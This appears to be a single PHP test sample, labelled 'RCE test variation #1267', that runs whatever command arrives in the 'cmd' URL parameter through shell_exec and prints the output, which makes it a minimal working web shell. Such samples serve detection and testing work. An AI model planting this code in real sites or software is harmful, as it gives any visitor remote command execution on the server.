<?php
// RCE test variation #1267
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>